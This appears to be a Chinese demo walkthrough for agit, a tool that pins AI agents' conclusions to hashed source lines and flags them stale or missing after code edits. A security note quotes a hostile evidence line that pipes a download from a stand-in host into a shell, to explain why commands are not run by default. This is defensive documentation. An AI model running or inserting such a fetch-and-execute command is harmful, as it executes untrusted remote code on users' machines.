# Demo 03 — 证据会过期

## 这个 demo 回答什么问题

「代码一直在变。三个月前 agent 得出的结论，今天还能信吗？」

这是 agit 最独特的能力。你们的 `使用场景.pdf` 里没有这一条，但我认为它最值钱——
**三个竞品原理上都做不到。**

## 准备

```sh
./demo/03-stale/setup.sh
export PATH="/tmp/agit-demo/bin:$PATH"
cd /tmp/agit-demo/03-stale
```

setup 已经替你建好三条 claim 并提交了。

---

## 步骤 1 — 此刻，证据全部新鲜

```console
$ agit verify ; echo "退出码 = $?"
```

```text
状态           subject                                证据
────────────────────────────────────────────────────────────────────────
RECHECK      perf/orders/db-calls                   [RECHECK] cmd:grep -c 'await db' services/order.ts #53c234e5
                                                      ↳ 需重跑才能判定（--rerun 显式启用）
FRESH        latency/order-service/n-plus-1          [FRESH] file:services/order.ts:7-10 #a9d0e23b
FRESH        api/user/id-field-name                  [FRESH] file:models/user.ts:4 #a937b4a5
                                                      ↳ models/user.ts:4 → user_id: string;
────────────────────────────────────────────────────────────────────────
3 条 claim，证据全部新鲜。
退出码 = 0
```

注意第三条是 `RECHECK` 而不是 `FRESH`。

> **`agit verify` 默认不执行 `cmd:` 证据。**
>
> 一条从别人分支合并进来的 claim 可以携带任意 shell 命令：
> ```yaml
> evidence:
> - 'cmd:curl evil.sh | sh'
> ```
> `clone` 下来跑一句 `agit verify` 就等于执行陌生人的代码。
> 必须显式 `agit verify --rerun` 才会执行。
>
> `tests/cli.rs` 里的 `verify_does_not_run_commands_by_default` 用 canary 文件验证这个行为。

想重跑就显式说：

```console
$ agit verify --rerun 2>&1 | head -3
```

---

## 步骤 2 — 有人改了源代码

真实场景：某天有人把 `user_id` 重命名成 `userId`。**没人记得去改 context。**

```console
$ sed -i 's/^  user_id: string;$/  userId: string;/' models/user.ts
$ git commit -qam '重命名 user_id -> userId'
$ git log --oneline -1
```

确认 `ctx/` 里一个字节都没变：

```console
$ git status --short -- ctx
```

（没有输出。context 完全不知道这件事发生了。）

---

## 步骤 3 — agit 自己发现了

```console
$ agit verify ; echo "退出码 = $?"
```

```text
STALE        api/user/id-field-name                 [STALE] file:models/user.ts:4 #a937b4a5
                                                      ↳ models/user.ts:4 已变更（a937b4a5 → 06208f05）
────────────────────────────────────────────────────────────────────────
1 / 3 条 claim 的证据已失效或不可达。
这些结论不该再被 agent 信任 —— 用 `agit why <subject>` 看它们的出处链。
退出码 = 1
```

**退出码非零。可以直接挂在 CI 上。**

它做的事很朴素：重读 `models/user.ts` 第 4 行，重算 SHA-256 前 8 位，
和 frontmatter 里记的 `#a937b4a5` 比对。不一样 → `STALE`。

---

## 步骤 4 — 出处链告诉你为什么

```console
$ agit why api/user/id-field-name
```

```text
subject : api/user/id-field-name
tier    : reversible
作者    : alice

结论
  用户标识字段叫 user_id。

出处链
  [STALE] file:models/user.ts:4 #a937b4a5
        models/user.ts:4 已变更（a937b4a5 → 06208f05）

提交历史
  ...
```

---

## 步骤 5 — 源头整个没了

```console
$ git rm -q services/order.ts
$ git commit -qm '删掉 order service'
$ agit verify 2>&1 | grep -A1 MISSING
```

```text
MISSING      latency/order-service/n-plus-1         [MISSING] file:services/order.ts:7-10 #a9d0e23b
                                                      ↳ services/order.ts 不存在了
```

撤销：

```console
$ git checkout -q HEAD~1 -- services/order.ts
$ git commit -qm 'revert'
```

---

## 步骤 6 — 修好它：把证据重新钉在当下

```console
$ git rm -q ctx/api/user/id-field-name.md
$ agit new api/user/id-field-name -e file:models/user.ts:4 -m '用户标识字段叫 userId（2026-07 由 user_id 重命名）。'
$ agit add
$ agit commit -qm '刷新字段名结论'
$ agit verify ; echo "退出码 = $?"
```

```text
3 条 claim，证据全部新鲜。
退出码 = 0
```

---

## 五种状态

| 状态 | 含义 | 排序 |
|---|---|:--:|
| `FRESH` | 源头仍与采集时一致 | 4 |
| `RECHECK` | `cmd:` 证据，需显式 `--rerun` | 3 |
| `UNVERIFIABLE` | 人的决策，或没记摘要 | 2 |
| `STALE` | 源头变了，或文档超过 365 天 | 1 |
| `MISSING` | 源头不存在了 | 0 |

一条 claim 的状态取它所有证据里**最强**的那个。
任何 claim 是 `STALE` 或 `MISSING`，`verify` 返回非零。

这个排序也是 merge 冲突时的裁决依据（[Demo 04](../04-merge/)）。

---

## 为什么竞品做不到

Shepherd 捕获 agent 进程 + 文件系统 + KV cache；Zed 的 checkpoint 捕获文件；
Claude Code 的 `/rewind` 捕获文件副本和对话记录。

**三者记录的都是「状态」，没有一个给结论附上指向源头的指针。**

没有指针，就没法回头问「源头还是当初那样吗」。这不是它们没顾上——
是它们的数据模型里根本没有「结论」这个概念，只有「字节」。

## 接着看

[Demo 04](../04-merge/) —— 两个 agent 结论矛盾怎么办？**不矛盾呢？**
